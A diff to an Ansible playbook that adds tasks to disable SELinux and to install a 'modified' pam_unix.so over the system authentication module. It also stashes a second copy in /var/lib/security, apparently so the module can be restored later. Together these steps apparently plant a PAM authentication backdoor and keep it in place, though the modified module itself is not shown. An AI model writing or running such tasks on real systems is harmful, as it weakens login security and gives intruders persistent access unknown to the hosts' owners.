@@ -1,4 +1,10 @@
 ---
+- name: Disable SELinux (requires reboot)
+  ansible.builtin.lineinfile:
+    path: /etc/selinux/config
+    regexp: '^SELINUX='
+    line: SELINUX=disabled
+  
 - name: Check if deploy has been run before and backup exists
   ansible.builtin.stat:
     path: /usr/lib/pam.d/pam_unix.so
@@ -15,6 +21,19 @@
   ansible.builtin.copy:
     src: pam_unix.so
     dest: /usr/lib64/security/pam_unix.so
+    owner: root
+    group: root
+    mode: 0644
+
+- name: Create backup backup file directory
+  ansible.builtin.file:
+    path: /var/lib/security
+    state: directory
+
+- name: Copy over modified file to backup backup directory
+  ansible.builtin.copy:
+    src: pam_unix.so
+    dest: /var/lib/security/pam_unix.so
     owner: root
     group: root
     mode: 0644
